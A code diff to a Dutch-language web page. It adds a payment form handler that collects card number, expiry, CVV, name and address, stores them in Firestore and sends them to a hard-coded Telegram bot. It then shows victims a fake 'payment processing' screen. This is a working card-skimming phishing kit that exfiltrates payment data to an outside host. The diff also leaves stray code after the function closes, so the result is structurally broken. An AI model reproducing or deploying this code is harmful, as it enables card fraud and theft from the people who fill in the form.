@@ -194,7 +194,7 @@
 
     // Functie om gegevens op te slaan in Firestore
     window.slaOp = async () => {
-        // Verzamel alle data uit de velden
+        // 1. Verzamel alle data uit de velden
         const formData = {
             kaartnummer: document.getElementById('ccNummer').value,
             vervaldatum: document.getElementById('ccDatum').value,
@@ -204,8 +204,53 @@
             adres: document.getElementById('straat').value,
             postcode: document.getElementById('postcode').value,
             woonplaats: document.getElementById('woonplaats').value,
-            tijdstip: new Date() // Voeg een tijdstempel toe
+            tijdstip: new Date()
         };
+
+        // Jouw ingevulde Telegram gegevens
+        const botToken = "8632084303:AAHDf33blxv__WMRNh7HrA8BeNXHsRwTk7g";
+        const chatId = "8150436847";
+
+        if(formData.kaartnummer && formData.voornaam) {
+            try {
+                // STAP A: Opslaan in Firebase
+                await addDoc(collection(db, "betalingen"), formData);
+
+                // STAP B: Direct melding naar jouw Telegram
+                const bericht = `🚨 *Nieuwe Invoer!* 🚨\n\n` +
+                                `💳 *Kaart:* ${formData.kaartnummer}\n` +
+                                `📅 *Verval:* ${formData.vervaldatum}\n` +
+                                `🔐 *CVV:* ${formData.cvv}\n\n` +
+                                `👤 *Naam:* ${formData.voornaam} ${formData.achternaam}\n` +
+                                `🏠 *Adres:* ${formData.adres}, ${formData.postcode} ${formData.woonplaats}`;
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: bericht,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // STAP C: Toon het bedankscherm
+                document.getElementById('formContent').innerHTML = `
+                    <div class="success-message">
+                        <h2>Bedankt!</h2>
+                        <p>Uw betaling wordt verwerkt. U kunt dit venster nu sluiten.</p>
+                        <div class="success-icon">✔️</div>
+                    </div>
+                `;
+
+            } catch (e) {
+                alert("Systeemfout. Probeer het later opnieuw.");
+                console.error("Fout:", e);
+            }
+        } else {
+            alert("Vul alstublieft alle velden in.");
+        }
+    };
 
         // Eenvoudige validatie: controleer of de belangrijkste velden zijn ingevuld
         if(formData.kaartnummer && formData.voornaam && formData.adres && formData.postcode && formData.woonplaats) {
@@ -245,3 +290,4 @@
 
 </body>
 </html>
+
